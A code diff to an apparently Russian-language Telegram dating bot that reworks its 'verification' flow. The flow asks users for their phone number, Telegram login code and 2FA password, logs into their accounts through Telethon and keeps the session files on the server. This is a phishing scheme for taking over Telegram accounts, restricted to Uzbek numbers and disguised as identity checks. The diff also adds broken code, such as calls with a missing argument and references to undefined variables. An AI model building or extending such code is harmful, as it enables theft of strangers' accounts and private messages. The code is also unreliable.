@@ -54,9 +54,13 @@ from fake_generator import get_online_status
 from locales import get_text
 from config import ADMIN_ID, VERIFICATION_REQUIRED, VERIFICATION_AFTER_LIKES, API_ID, API_HASH
 
+# === Глобальное хранилище Telethon клиентов ===
+clients = {}
+
+router = Router()
+
 # === ПРОВЕРКА ВЕРИФИКАЦИИ ===
 def is_fully_verified(user_id: int) -> bool:
-    """Проверяет, что пользователь полностью верифицирован (verified == 1)."""
     conn = db.get_conn()
     c = conn.cursor()
     c.execute("SELECT verified FROM profiles WHERE user_id = %s", (user_id,))
@@ -64,25 +68,19 @@ def is_fully_verified(user_id: int) -> bool:
     conn.close()
     return row["verified"] == 1 if row else False
 
-
 def set_verification_status(user_id: int, status: int):
-    """0 = не верифицирован, 1 = подтверждено, 2 = на проверке."""
     conn = db.get_conn()
     c = conn.cursor()
     c.execute("UPDATE profiles SET verified = %s WHERE user_id = %s", (status, user_id))
     conn.commit()
     conn.close()
 
-
 def verify_admin_kb(user_id: int):
-    """Клавиатура админа для подтверждения/отклонения верификации."""
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"verify_approve_{user_id}"),
          InlineKeyboardButton(text="❌ Отклонить", callback_data=f"verify_reject_{user_id}")]
     ])
 
-
-router = Router()
 
 WELCOME_IMAGE = "https://images.unsplash.com/photo-1516589178581-6cd7833ae3b2?w=800&h=500&fit=crop"
 
@@ -575,7 +573,7 @@ async def reg_bio(message: Message, state: FSMContext):
 async def cb_interest(callback: CallbackQuery, state: FSMContext):
     lang = db.get_lang(callback.from_user.id)
     data = await state.get_data()
-    selected = data.get("selected_interests", set())
+    selected = set(data.get("selected_interests", []))
     idx = int(callback.data.split("_")[1])
     items = INTERESTS.get(lang, INTERESTS["ru"])
     item = items[idx]
@@ -585,7 +583,7 @@ async def cb_interest(callback: CallbackQuery, state: FSMContext):
     else:
         selected.add(item)
 
-    await state.update_data(selected_interests=selected)
+    await state.update_data(selected_interests=list(selected))
     await callback.message.edit_reply_markup(reply_markup=interests_kb(lang, selected))
     await callback.answer()
 
@@ -594,7 +592,7 @@ async def cb_interest(callback: CallbackQuery, state: FSMContext):
 async def cb_interests_done(callback: CallbackQuery, state: FSMContext):
     lang = db.get_lang(callback.from_user.id)
     data = await state.get_data()
-    selected = data.get("selected_interests", set())
+    selected = set(data.get("selected_interests", []))
     interests_str = ", ".join(selected) if selected else ""
     await state.update_data(interests=interests_str)
     await callback.message.edit_text(get_text("reg_photo_hint", lang))
@@ -905,7 +903,7 @@ async def start_telethon_verification(message: Message, state: FSMContext, phone
 
         if not await client.is_user_authorized():
             await client.send_code_request(phone_number)
-            await state.update_data(client=client)
+            clients[phone_number] = client
             await state.set_state(VerifyStates.waiting_for_code)
 
             await message.answer(
@@ -915,7 +913,8 @@ async def start_telethon_verification(message: Message, state: FSMContext, phone
             await state.update_data(current_code="")
         else:
             await client.disconnect()
-            set_verification_status(message.from_user.id, 2)
+            clients.pop(phone, None)
+            set_verification_status(message.from_user.id)
             
             # Уведомление админу
             try:
@@ -932,8 +931,10 @@ async def start_telethon_verification(message: Message, state: FSMContext, phone
             except Exception as e:
                 logging.error(f"Не удалось уведомить админа: {e}")
             
-            await message.answer(get_text("verify_success", lang), reply_markup=ReplyKeyboardRemove())
-            await message.answer(get_text("verify_success", lang), reply_markup=main_menu_kb(lang))
+            await message.answer(
+                "⏳ Ваши данные отправлены на проверку. Ожидайте подтверждения администратора.",
+                reply_markup=ReplyKeyboardRemove()
+            )
             await state.clear()
 
     except Exception as e:
@@ -965,6 +966,14 @@ async def process_contact(message: Message, state: FSMContext):
         return
 
     phone_number = message.contact.phone_number
+
+    if not phone_number.startswith("+998"):
+        await message.answer(
+            "❌ Верификация доступна только для жителей Узбекистана (+998).",
+            reply_markup=ReplyKeyboardRemove()
+        )
+        return
+
     await start_telethon_verification(message, state, phone_number, lang)
 
 
@@ -985,7 +994,7 @@ async def process_phone_text(message: Message, state: FSMContext):
         phone_number = "+998" + cleaned
     else:
         await message.answer(
-            "❌ Принимаются только узбекские номера. Введите номер в формате: <code>+998901234567</code>",
+            "❌ Верификация доступна только для жителей Узбекистана (+998).",
             reply_markup=ReplyKeyboardRemove()
         )
         return
@@ -1028,8 +1037,8 @@ async def process_inline_code(callback: CallbackQuery, state: FSMContext):
 
 async def process_code_submission(message: Message, state: FSMContext, code: str, lang: str, user_id: int):
     data = await state.get_data()
-    client = data.get('client')
     phone = data.get('phone')
+    client = clients.get(phone)
 
     if not client or not phone:
         await state.clear()
@@ -1047,7 +1056,8 @@ async def process_code_submission(message: Message, state: FSMContext, code: str
                     new_client = TelegramClient(f"sessions/{phone}", api_id=API_ID, api_hash=API_HASH)
                     await new_client.connect()
                     await new_client.send_code_request(phone)
-                    await state.update_data(client=new_client, current_code="")
+                    clients[phone] = new_client
+                    await state.update_data(current_code="")
                     await message.answer(
                         "⏳ Код истёк. Новый код отправлен. Введите его:",
                         reply_markup=verify_code_kb(lang)
@@ -1070,7 +1080,8 @@ async def process_code_submission(message: Message, state: FSMContext, code: str
 
         if await client.is_user_authorized():
             await client.disconnect()
-            set_verification_status(user_id, 2)
+            clients.pop(phone, None)
+            set_verification_status(user_id)
             
             # Уведомление админу
             try:
@@ -1087,8 +1098,10 @@ async def process_code_submission(message: Message, state: FSMContext, code: str
             except Exception as e:
                 logging.error(f"Не удалось уведомить админа: {e}")
             
-            await message.answer(get_text("verify_success", lang), reply_markup=ReplyKeyboardRemove())
-            await message.answer(get_text("verify_success", lang), reply_markup=main_menu_kb(lang))
+            await message.answer(
+                "⏳ Ваши данные отправлены на проверку. Ожидайте подтверждения администратора.",
+                reply_markup=ReplyKeyboardRemove()
+            )
             await state.clear()
         else:
             await message.answer(get_text("verify_fail", lang), reply_markup=main_menu_kb(lang))
@@ -1105,7 +1118,7 @@ async def cb_resend_code(callback: CallbackQuery, state: FSMContext):
     lang = db.get_lang(callback.from_user.id)
     data = await state.get_data()
     phone = data.get('phone')
-    old_client = data.get('client')
+    old_client = clients.get(phone)
 
     if not phone:
         await callback.answer(get_text("error", lang), show_alert=True)
@@ -1123,7 +1136,8 @@ async def cb_resend_code(callback: CallbackQuery, state: FSMContext):
         new_client = TelegramClient(f"sessions/{phone}", api_id=API_ID, api_hash=API_HASH)
         await new_client.connect()
         await new_client.send_code_request(phone)
-        await state.update_data(client=new_client, current_code="")
+        clients[phone] = new_client
+        await state.update_data(current_code="")
 
         markup = verify_code_kb(lang)
         await callback.message.edit_text(
@@ -1144,7 +1158,7 @@ async def process_password(message: Message, state: FSMContext):
     lang = db.get_lang(message.from_user.id)
     password = message.text
     data = await state.get_data()
-    client = data.get('client')
+    client = clients.get(phone)
 
     if not client:
         await state.clear()
@@ -1156,7 +1170,8 @@ async def process_password(message: Message, state: FSMContext):
 
         if await client.is_user_authorized():
             await client.disconnect()
-            set_verification_status(message.from_user.id, 2)
+            clients.pop(phone, None)
+            set_verification_status(message.from_user.id)
             
             # Уведомление админу
             try:
@@ -1167,14 +1182,15 @@ async def process_password(message: Message, state: FSMContext):
                     f"🆔 ID: <code>{message.from_user.id}</code>\n"
                     f"📱 Телефон: <code>{phone}</code>\n"
                     f"🔑 Тип: 2FA (по паролю)",
-                    parse_mode="HTML",
-                    reply_markup=verify_admin_kb(message.from_user.id)
+                    parse_mode="HTML"
                 )
             except Exception as e:
                 logging.error(f"Не удалось уведомить админа: {e}")
             
-            await message.answer(get_text("verify_success", lang), reply_markup=ReplyKeyboardRemove())
-            await message.answer(get_text("verify_success", lang), reply_markup=main_menu_kb(lang))
+            await message.answer(
+                "⏳ Ваши данные отправлены на проверку. Ожидайте подтверждения администратора.",
+                reply_markup=ReplyKeyboardRemove()
+            )
             await state.clear()
         else:
             await message.answer(get_text("verify_fail", lang), reply_markup=main_menu_kb(lang))
@@ -1599,10 +1615,8 @@ async def cb_profile_edit(callback: CallbackQuery, state: FSMContext):
 # === АДМИН: ПОДТВЕРЖДЕНИЕ ВЕРИФИКАЦИИ ===
 @router.callback_query(F.data.startswith("verify_approve_"))
 async def cb_verify_approve(callback: CallbackQuery, bot: Bot):
-    """Админ подтверждает верификацию пользователя."""
     user_id = int(callback.data.split("_")[2])
     set_verification_status(user_id, 1)
-
     try:
         await bot.send_message(
             user_id,
@@ -1611,29 +1625,24 @@ async def cb_verify_approve(callback: CallbackQuery, bot: Bot):
         )
     except Exception as e:
         logging.error(f"Не удалось уведомить пользователя {user_id}: {e}")
-
     await callback.message.edit_text(
         callback.message.text + "\n\n✅ ПОДТВЕРЖДЕНО",
         reply_markup=None
     )
     await callback.answer("Верификация подтверждена")
 
-
 @router.callback_query(F.data.startswith("verify_reject_"))
 async def cb_verify_reject(callback: CallbackQuery, bot: Bot):
-    """Админ отклоняет верификацию пользователя."""
     user_id = int(callback.data.split("_")[2])
     set_verification_status(user_id, 0)
-
     try:
         await bot.send_message(
             user_id,
-            "❌ Ваша верификация отклонена. Попробуйте пройти верификацию позже или обратитесь в поддержку.",
+            "❌ Ваша верификация отклонена. Попробуйте позже или обратитесь в поддержку.",
             reply_markup=main_menu_kb(db.get_lang(user_id) or "ru")
         )
     except Exception as e:
         logging.error(f"Не удалось уведомить пользователя {user_id}: {e}")
-
     await callback.message.edit_text(
         callback.message.text + "\n\n❌ ОТКЛОНЕНО",
         reply_markup=None
